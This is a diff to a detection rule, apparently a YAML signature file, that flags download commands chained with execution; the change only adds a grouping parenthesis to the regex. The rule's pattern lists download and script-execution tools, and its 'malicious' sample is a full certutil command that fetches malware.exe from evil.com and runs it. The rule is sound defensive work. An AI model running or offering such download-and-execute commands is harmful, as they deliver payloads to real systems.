@@ -4,7 +4,7 @@ description: >
   Detects download commands chained with execution. Multi-stage attack pattern for automated payload delivery.
 
 pattern: |
-  (?i)(certutil|bitsadmin|curl|wget|powershell|iwr).*(https?|ftp)://.*(\&\&|\|\||;|\|).*(cmd|powershell|bash|sh|rundll32|regsvr32|mshta|wscript|cscript|\.exe|\.bat|\.vbs)
+  (?i)((certutil|bitsadmin|curl|wget|powershell|iwr).*(https?|ftp)://.*(\&\&|\|\||;|\|).*(cmd|powershell|bash|sh|rundll32|regsvr32|mshta|wscript|cscript|\.exe|\.bat|\.vbs))
 
 malicious:
   - "certutil -urlcache -f http://evil.com/malware.exe C:\\malware.exe && C:\\malware.exe"
